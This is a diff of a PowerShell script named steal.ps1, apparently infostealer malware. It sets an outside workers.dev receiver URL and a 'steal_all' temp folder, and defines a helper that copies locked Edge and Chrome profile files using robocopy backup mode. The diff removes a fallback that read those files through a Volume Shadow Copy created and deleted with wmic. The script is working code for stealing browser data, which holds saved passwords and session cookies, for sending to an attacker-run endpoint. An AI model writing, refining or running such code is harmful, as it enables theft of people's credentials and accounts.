@@ -1,5 +1,5 @@
 # steal.ps1
-# Forces Volume Shadow Copy to read locked Edge/Chrome files.
+# Uses robocopy /B to copy locked Edge/Chrome files.
 
 $worker_url = "https://reciever.tyceno89.workers.dev"
 $temp = "$env:TEMP\steal_all"
@@ -23,30 +23,18 @@ $browsers = @(
     }
 )
 
-# --- 2) Force Volume Shadow Copy (VSS) to copy locked files ---
+# --- 2) Helper to copy locked files ---
 function Copy-LockedFile {
     param($src, $dst)
-    # Try normal copy first
+    # Try normal copy
     try { Copy-Item $src $dst -Force -ErrorAction Stop; return $true } catch {}
-    # Try robocopy backup mode
+    # Try robocopy with backup mode (/B)
     try {
         $src_dir = Split-Path $src
         $src_file = Split-Path $src -Leaf
         $dst_dir = Split-Path $dst
-        robocopy $src_dir $dst_dir $src_file /B /R:1 /W:1 /NFL /NDL /NJH /NJS | Out-Null
+        $result = robocopy $src_dir $dst_dir $src_file /B /R:1 /W:1 /NFL /NDL /NJH /NJS
         if (Test-Path $dst) { return $true }
-    } catch {}
-    # Fallback: use Volume Shadow Copy via wmic (works on Windows 10/11)
-    try {
-        $shadow = wmic shadowcopy call create Volume='C:\' | Select-String "ShadowID"
-        if ($shadow) {
-            $shadow_id = $shadow -replace '.*\{|\}.*',''
-            $shadow_path = "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy$shadow_id\"
-            $src_shadow = $src -replace '^C:\\', $shadow_path
-            Copy-Item $src_shadow $dst -Force -ErrorAction Stop
-            wmic shadowcopy delete id={$shadow_id} | Out-Null
-            return $true
-        }
     } catch {}
     return $false
 }
